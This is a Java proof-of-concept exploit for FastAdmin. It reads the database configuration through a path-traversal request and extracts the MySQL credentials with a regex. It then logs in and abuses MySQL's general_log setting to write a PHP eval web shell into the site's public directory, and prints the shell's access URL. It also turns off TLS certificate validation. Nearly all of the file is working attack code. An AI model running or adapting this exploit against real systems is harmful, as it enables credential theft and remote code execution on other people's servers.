package org.example;

import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.io.IOException;
import java.net.*;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.security.cert.X509Certificate;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class FuzzPoc {
    public String url= "";
    public String ip = "";
    HttpClient client;

    static String payload_1 = "index/ajax/lang?lang=..//..//application/database";


    public static String getRandomString(){
        String str="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        Random random=new Random();
        StringBuffer sb=new StringBuffer();
        for(int i = 0; i < 12; i++){
            int number=random.nextInt(52);
            sb.append(str.charAt(number));
        }
        return sb.toString();
    }

    public FuzzPoc(String url) throws UnknownHostException {
        this.url = url;
        // 定义用于匹配域名或IP地址的正则表达式
        String hostRegex = "https?://([\\w.-]+)(:\\d+)?";
        Pattern pattern = Pattern.compile(hostRegex);
        Matcher matcher = pattern.matcher(url);
        if (matcher.find()){
            String host = matcher.group(1); // 提取主机部分 (IP或域名)
            // 获取所有IP地址
            InetAddress[] inetAddresses = InetAddress.getAllByName(host);
            this.ip = String.valueOf(inetAddresses[0]).replace("/","");
        }
    }

    public void TestAlive(){
        try {
            // 创建一个信任所有证书的 TrustManager
            TrustManager[] trustAllCerts = new TrustManager[]{
                    new X509TrustManager() {
                        public X509Certificate[] getAcceptedIssuers() {
                            return null;
                        }
                        public void checkClientTrusted(X509Certificate[] certs, String authType) {
                        }
                        public void checkServerTrusted(X509Certificate[] certs, String authType) {
                        }
                    }
            };

            // 设置 SSL 上下文，使用我们自定义的 TrustManager
            SSLContext sslContext = SSLContext.getInstance("TLS");
            sslContext.init(null, trustAllCerts, new java.security.SecureRandom());

            // 创建 HttpClient，设置 SSL 上下文
            this.client = HttpClient.newBuilder()
                    .sslContext(sslContext)
                    .build();

            // 创建HttpRequest对象
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(new URI(url))
                    .GET()
                    .build();

            // 发送请求并获取响应
            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
            if (response.statusCode() == 200) {
                System.out.println("\033[32;1m[+]Target:" + url + " is alive" + "\033[0m");
            }
        } catch (Exception e) {
            System.out.println("\033[31;1m[-] cannot connect to " + url + "\033[0m");
        }
    }

    public void FuzzPayload_1() throws IOException, URISyntaxException, InterruptedException, SQLException {
        String urlFuzz_1 = this.url + payload_1;

        // 创建HttpRequest对象
        HttpRequest request = HttpRequest.newBuilder()
                .uri(new URI(urlFuzz_1))
                .GET()
                .build();

        // 发送请求并获取响应
        HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
        if (response.statusCode() != 200){
            throw new RuntimeException("\033[31;1m[+] cannot connect to " + urlFuzz_1 + "\033[0m");
        }else {
            String respText = response.body();
            // 定义正则表达式,匹配数据
            String regex = "\"(hostname|username|database|password|hostport)\":\\s*\"(.*?)\"";
            Pattern pattern = Pattern.compile(regex);
            Matcher matcher = pattern.matcher(respText);
            Map<String,String> sqlMap = new HashMap<>();

            // 迭代查找匹配的字段和值
            while (matcher.find()) {
                String key = matcher.group(1);  // 字段名 (hostname, username, etc.)
                String value = matcher.group(2);  // 字段值 (localhost, admin, etc.)
                sqlMap.put(key,value);
                System.out.println("\033[32;1m[+]" + key + ":" + value  + "\033[0m");
            }
            Connection connection = MySQLTest.TestConnect(this.ip,sqlMap.get("hostport"),sqlMap.get("database"),sqlMap.get("username"),sqlMap.get("password"));
            if (connection != null)
            {
                // 创建 Statement 对象
                Statement statement = connection.createStatement();
                String version="";
                String basedir="";
                String ShellCmd = getRandomString();
                // 执行 SQL 查询：获取 MySQL 版本
                String sql = "SELECT VERSION();";
                ResultSet resultSet = statement.executeQuery(sql);
            /*
            select @@basedir;
            show variables like '%general%';
            set global general_log = on;
            set global general_log_file = 'D:/WWWSC/www/public/api.php';
            select '<?php eval($_REQUEST["x"]);?>';
            */
                // 处理查询结果
                if (resultSet.next()) {
                    version = resultSet.getString(1);
                    System.out.println("\033[32;1m[+]" + "目标数据库MySQL版本: " + version + "\033[0m");
                }
                sql = "select @@basedir;";
                resultSet = statement.executeQuery(sql);
                if (resultSet.next()) {
                    basedir = resultSet.getString(1);
                    System.out.println("\033[32;1m[+]" + "目标数据库根路径为: " + basedir + "\033[0m");
                }
                String ShellPath = basedir.substring(0,basedir.indexOf("mysql")) + "www/public/api.php";
                sql = "set global general_log = on;";
                statement.execute(sql);
                sql = "set global general_log_file = '" +  ShellPath + "';";
                statement.execute(sql);

                sql = "select '<?php echo eval($_POST[\"" + ShellCmd +"\"]);?>';";
                statement.execute(sql);
                sql = "set global general_log = off;";
                statement.execute(sql);
                System.out.println("\033[32;1m[+]" + "目标网站Shell已经写入\033[0m");
                System.out.println("\033[32;1m[+]" + "访问" + this.url + "api.php/?" + ShellCmd + "\033[0m");
                // 关闭连接
                connection.close();
            }
            else {
                System.out.println("\033[31;1m[-]" + "不存在FastAdmin任意文件读取漏洞!" + "\033[0m");
            }
        }
    }

    public void Exp() throws IOException, URISyntaxException, InterruptedException, SQLException {
        TestAlive();
        FuzzPayload_1();
    }
}
